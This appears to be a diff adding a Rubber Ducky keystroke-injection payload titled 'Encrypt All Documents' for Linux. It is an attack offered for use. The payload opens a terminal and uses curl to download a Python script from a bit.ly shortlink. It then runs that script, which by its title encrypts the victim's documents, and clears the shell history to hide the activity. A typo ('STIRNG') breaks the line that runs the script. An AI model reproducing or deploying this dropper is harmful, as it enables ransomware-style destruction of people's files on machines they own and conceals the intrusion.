@@ -1,0 +1,22 @@
+REM ########################################
+REM #                                      |
+REM # Title        : Encrypt All Documents |
+REM # Author       : Zenin                 |
+REM # Version      : 1.0                   |
+REM # Category     : Execution             |
+REM # Target       : Linux                 |
+REM #                                      |
+REM ########################################
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+STRING curl bit.ly/EncryptAllDocuments > script.py
+ENTER
+
+REM It depends by the internet connection, btw 2/3 seconds is a lot for a fiew text line...
+DELAY 2000
+
+STIRNG python3 script.py; history -c; exit;
+ENTER
